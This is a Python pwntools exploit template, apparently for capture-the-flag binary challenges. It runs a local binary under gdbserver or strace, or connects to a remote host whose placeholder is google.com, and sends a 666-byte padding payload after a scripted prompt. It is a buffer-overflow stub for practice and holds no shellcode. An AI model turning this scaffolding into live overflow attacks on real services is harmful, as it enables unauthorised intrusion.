#!/usr/bin/env python
import sys
import struct
from pwn import *

####################################################
##################### EXPLOIT ######################
####################################################
#CHANGE THESE PARAMS
FILE 	= './hello_world'
F_PARAM = [] #file arguments(if any) go here
HOST 	= 'google.com'
PORT 	= '-1'


def getpayload():
	payload = ''

	#Padding
	payload += 'A'*666

	return payload


def pwn(p):
	payload = getpayload()
	print(p.recvuntil('People are strange when you\'re a stranger', timeout=10*60))
	p.sendline('Faces look ugly when you\'re alone%s' % payload)



####################################################
##################### TEMPLATE #####################
####################################################
USAGE = """
Options:
\t[-n, --network]\tPerform attack on live (n)etwork (Default: local binary file)
\t[-g, --gdb]\t\tLaunch binary with GDB Server (Can not be used against a live network target)
\t[-s, --strace]\t\tLaunch binary via strace (Can not be used against a live network target)
"""
GDBPORT = 4200

def launch_pwn(attack_network, gdb_server, strace):
	p = None
	if attack_network:
		p = remote(HOST, PORT)
	else:
		if gdb_server:
			fileparams = ['/usr/bin/gdbserver', 'localhost:%d' % GDBPORT, FILE]
		elif strace:
			fileparams = ['/usr/bin/strace', FILE]
		else:
			fileparams = [FILE]

		for arg in F_PARAM:
			fileparams.append(arg)

		p = process(fileparams)
	try:
		pwn(p)
	except Exception as e:
		#TODO, real exception handling or something
		print('Exception ocurred: %s' % str(e))
		p.clean_and_log()
		raise e
	p.clean_and_log()


def main():
	gdb_server 		= False
	strace			= False
	attack_network 	= False
	for i in sys.argv:
		if i == '-g' or i == '--gdb':
			gdb_server = True
		elif i == '-n' or i == '--network':
			attack_network = True
		elif i == '-s' or i == '--strace':
			strace = True
		elif i == sys.argv[0]:
			pass
		else:
			usage()
			exit()

	launch_pwn(attack_network, gdb_server, strace)


def usage():
	print('Usage ./%s [OPTIONS]%s' % (sys.argv[0], USAGE))


if __name__ == "__main__":
	main()
